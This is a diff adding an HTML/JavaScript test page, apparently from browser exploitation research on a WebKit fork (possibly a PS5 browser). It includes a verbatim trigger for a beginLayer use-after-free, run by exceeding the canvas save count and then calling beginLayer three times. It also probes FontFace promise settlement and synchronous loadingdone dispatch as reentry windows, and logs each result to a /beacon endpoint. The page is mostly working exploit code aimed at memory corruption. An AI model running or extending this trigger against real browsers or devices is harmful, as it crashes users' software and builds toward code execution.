@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V936</title></head>
+<body><pre id="out">V936 - FontProxy settle anatomy (fulfill value?) + loadingdone sync-dispatch test + beginLayer UAF (e0558372) verbatim trigger (no reentry needed)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V936-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,700))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v936 - v935 established: PS5 local() loads that MATCH fulfill
+ * SYNCHRONOUSLY inside measureText (D0-D3 status=loaded in the same task),
+ * but the FontFace.prototype.then getter never fires. Hypothesis: this
+ * fork's FontFace.loaded fulfills with undefined (old WebKit behavior),
+ * so no thenable Get runs at settlement. Also: non-matching local()
+ * sources are never even consulted (status stays 'unloaded') - the
+ * reject path has no settlement to hook.
+ *
+ * SECTIONS:
+ *   A - fulfill-value anatomy: SST face, load via measureText, reaction
+ *       on face.loaded BEFORE settle records what the promise fulfills
+ *       with (face itself? undefined?). The reaction is a microtask; its
+ *       beacon arrives after the script task drains - order it LAST.
+ *   B - loadingdone sync-dispatch test: if document.fonts fires the event
+ *       SYNCHRONOUSLY during the sync load window inside measureText,
+ *       a listener is a JS reentry into the middle of metricsOfPrimaryFont
+ *       - an alternative window that needs no promise machinery. The
+ *       listener runs 18 saves guarded; flag read immediately after
+ *       measureText tells whether it fired in-window.
+ *   C - beginLayer UAF (e0558372, Bugzilla 318378) verbatim trigger:
+ *       save() x20000 (MaxSaveCount exceeded -> realizeSavesLoop early
+ *       exit), then beginLayer() x3 -> layer overwrite drops the previous
+ *       layer while the new layer holds a raw pointer to the previous
+ *       GraphicsContext -> UAF. NO reentry, NO promise, NO font needed -
+ *       only requires beginLayer to exist (CanvasLayersEnabled).
+ *       Patched tree: saves ignored, beginLayer early-returns, survives.
+ *       Vulnerable tree: crash at beginLayer or at the next draw/restore
+ *       that touches the dangling GraphicsContext.
+ *   C runs LAST - if it kills the WebProcess, A/B beacons are already in
+ *   the log. Beacon order is the diagnosis.
+ */
+
+/* ENV */
+try{
+  var c0=document.createElement('canvas').getContext('2d');
+  bk('ENV','beginLayer='+typeof c0.beginLayer+' endLayer='+typeof c0.endLayer+
+    ' loadingdone-hook-able='+(typeof document.fonts.addEventListener==='function'));
+}catch(e){ bk('ENV-throw',String(e)); }
+
+/* B: loadingdone sync dispatch + in-window reentry attempt */
+var bFlag=0, bTag=null;
+try{
+  var faceB=new FontFace('VPB','local(\'SST\')');
+  faceB.loaded;
+  document.fonts.add(faceB);
+  var ctxB=document.createElement('canvas').getContext('2d');
+  ctxB.save(); ctxB.lineWidth=0.5;
+  ctxB.font='10px VPB';
+  try{
+    document.fonts.addEventListener('loadingdone',function(ev){
+      bFlag=1; bTag=String(ev.type);
+      for(var j=0;j<18;j++){ try{ ctxB.save(); ctxB.lineWidth=1+j; }catch(e){ break; } }
+    });
+  }catch(e){ bk('B-list-err',String(e)); }
+  var wB=ctxB.measureText('a');
+  bk('B','measureText OK w='+wB.width+' inWindowFlag='+bFlag+' faceStatus='+faceB.status);
+  if(bFlag){ bk('B-HIT','loadingdone dispatched SYNCHRONOUSLY inside measureText = reentry window exists'); }
+}catch(e){ bk('B-throw',String(e)); }
+
+/* A: fulfill value anatomy (reaction beacon arrives post-task) */
+try{
+  var faceA=new FontFace('VPA','local(\'Arial\')');
+  var loadedPromise=faceA.loaded;
+  document.fonts.add(faceA);
+  loadedPromise.then(function(v){
+    bk('A-FULFILL','typeof='+typeof v+' isFace='+(v===faceA)+
+      ' ctor='+(v&&v.constructor?v.constructor.name:'-'));
+  },function(err){
+    bk('A-REJECT','typeof='+typeof err+' ctor='+(err&&err.constructor?err.constructor.name:'-')+' msg='+String(err).slice(0,80));
+  });
+  var ctxA=document.createElement('canvas').getContext('2d');
+  ctxA.font='10px VPA';
+  var wA=ctxA.measureText('a');
+  bk('A','measureText OK w='+wA.width+' faceStatus='+faceA.status);
+}catch(e){ bk('A-throw',String(e)); }
+
+/* C: beginLayer UAF verbatim (LAST - may kill the WebProcess) */
+try{
+  var ctxC=document.createElement('canvas').getContext('2d');
+  bk('C-A','ctx ready, beginLayer='+typeof ctxC.beginLayer);
+  if(typeof ctxC.beginLayer==='function'){
+    for(var i=0;i<20000;i++){ try{ ctxC.save(); }catch(e){ bk('C-save-err',i+' '+String(e)); break; } }
+    bk('C-B','20000 saves done (MaxSaveCount exceeded)');
+    ctxC.beginLayer();
+    bk('C-D','beginLayer #1 returned');
+    ctxC.beginLayer();
+    bk('C-E','beginLayer #2 returned');
+    ctxC.beginLayer();
+    bk('C-F','beginLayer #3 returned');
+    try{ ctxC.restore(); bk('C-G','restore OK'); }catch(e){ bk('C-G-throw',String(e)); }
+    try{ ctxC.fillRect(0,0,10,10); bk('C-H','fillRect OK'); }catch(e){ bk('C-H-throw',String(e)); }
+  }else{
+    bk('C-SKIP','beginLayer absent - CanvasLayersEnabled off on this port; lane closed at the API gate');
+  }
+}catch(e){ bk('C-throw',String(e)); }
+
+bk('DONE','script end; A-FULFILL beacon arrives after this (microtask drain)');
+</script></body></html>
